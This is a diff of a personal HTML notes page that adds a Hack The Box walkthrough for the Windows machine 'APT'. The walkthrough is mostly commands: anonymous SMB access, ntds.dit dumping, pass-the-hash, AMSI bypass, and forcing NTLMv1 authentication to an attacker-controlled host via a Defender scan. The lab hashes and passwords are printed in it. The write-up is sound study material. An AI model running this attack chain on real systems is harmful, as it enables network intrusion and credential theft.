@@ -295,7 +295,7 @@
     <div id="particles-js"></div>
     <header>
         <h2 class="glow"># joe95's Notes</h2>
-        <br><span>last_update:Dec.13.2023</span>
+        <br><span>last_update:Dec.14.2023</span>
     </header>
 
     <main>
@@ -1878,21 +1878,42 @@
                     <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="insane">APT (Insane/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br><span class="step_title">Privilege_escalation</span>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
-                        <br>
+                        <br>`python3 IOXIDResolver.py -t 10.10.10.213` found dead:beef::b885:d62a:d679:573f then nmap scan the ipv6
+                        <br>`cme smb dead:beef::b885:d62a:d679:573f --shares -u '' -p ''` shows 'backup' share has 'READ' access (crackmapexec need version 5.1.6dev above )
+                        <br>`smbclient \\\\dead:beef::b885:d62a:d679:573f\\backup` anonymous login found backup.zip `smbget smb://apt/backup/backup.zip`
+                        <br>zip2john and crack got pass: iloveyousomuch  unzip got ntds.dit and SYSTEM
+                        <br>`secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL > backup_ad_dump`
+                        <br>`wc -l backup_ad_dump` 8005 lines `grep ':::' backup_ad_dump | awk -F: '{print $1}' > users` and `wc -l users` 2000 lines
+                        <br>`kerbrute_linux_amd64 userenum -d htb.local --dc apt.htb users` found 'Administrator@htb.local' 'APT$@htb.local' 'henry.vinson@htb.local'
+                        <br>`cat backup_ad_dump| grep henry.vinson` henry.vinson:3647:aad3b435b51404eeaad3b435b51404ee:2de80758521541d19cabba480b260e8f:::
+                        <br>Failed: `crackmapexec smb htb.local -u henry.vinson -H hashes` STATUS_LOGON_FAILURE 
+                        <br>`reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt.htb query -keyName HKU` got sub dir like 'Software' and 'Network' ...
+                        <br>`reg.py -hashes :e53d87d42adaa3ca32bdb34a876cbffb htb.local/henry.vinson@apt.htb query -keyName HKU\\Software\\GiganticHostingManagementSystem` found cred henry.vinson_adm:G1#Ny5@2dvht
+                        <br>`evil-winrm -i apt.htb -u henry.vinson_adm -p G1#Ny5@2dvht`
+                        <br><span class="step_title">Privilege_escalation(henry->admin)</span>
+                        <br>*Evil-WinRM* PS> Bypass-4MSI
+                        <br>*Evil-WinRM* PS> Invoke-Binary /root/tool/winPEASany_ofs.exe
+                        <br>C:\Users\henry.vinson_adm\AppData\Roaming\microsoft\windows\powershell\PSREadline\ConsoleHost_history.txt has a line mention "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force
+                        <br>*Evil-WinRM* PS> Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel
+                        <br>which found "lmcompatibilitylevel : 2"
+                        <br>According to https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level
+                        <br>"2" means Send NTLM response only, Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication.
+                        <br>triger auth to kali by invoke defender scan on smb file to responder
+                        <br>edit 'Challenge = 1122334455667788' '/etc/responder/Responder.conf' and start `responder -I tun0 --lm`
+                        <br>*Evil-WinRM* PS C:\Program Files\windows defender> .\MpCmdRun.exe -Scan -ScanType 3 -File \\10.10.14.9\share\file.txt
+                        <br>note: -ScanType 1:quick scan, 2:full scan, 3:specify file
+                        <br>OR Collect Net-NTLMv1 hash Via RPC / RoguePotato [ippsec_video][0xdf_post]
+                        <br>APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788
+                        <br>`python3 ~/tool/ntlmv1-multi-master/ntlmv1.py --ntlmv1 APT$::HTB:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384:1122334455667788`
+                        <br>script output: "To Crack with crack.sh use the following token   NTHASH:95ACA8C7248774CB427E1AE5B8D5CE6830A49B5BB858D384"
+                        <br>everybody's walkthrough using https://crack.sh/get-cracking/ to crack, and receive email within 1 min. but now that site/page showing "down for maintenance"
+                        <br>which is why I never actually cracked the NTLMv1 Hash, have copy from others: d167c3238864b12f5f82feae86a7f798
+                        <br>`secretsdump.py -hashes :d167c3238864b12f5f82feae86a7f798 'htb.local/APT$@htb.local'` got administrator NTLM
+                        <br>`evil-winrm -u administrator -H c370bddf384a691d811ff3495e8a72e2 -i apt.htb`
                     </div>
                 </div>
                 <div class="sub_dropdown">
-                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span>Arctic (difficulty/Windows)</span> </button>                    
+                    <button class="sub_dropdown_button"> <img src="images/hackthebox_icon.png" alt="img"> <span class="easy">Arctic (Easy/Windows)</span> </button>                    
                     <div class="sub_dropdown_content">
                         <span class="step_title">Initial_Foothold</span>
                         <br>
@@ -3030,7 +3051,8 @@
         </div>
         <!-- ========================pico_ctf_content======================== -->
         <h5>Currently Studying OSCP</h5>
-        <h5>Email: <span id="protectedEmail"></span></h5>
+        <h5><span id="protectedEmail"></span></h5>
+        <h5><a href="https://www.linkedin.com/in/joe912693295" target="_blank">LinkedIn Profile</a></h5>
         <h5>Certified: CCNP-RS | CCIE-Security</h5>
     </main>
     <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
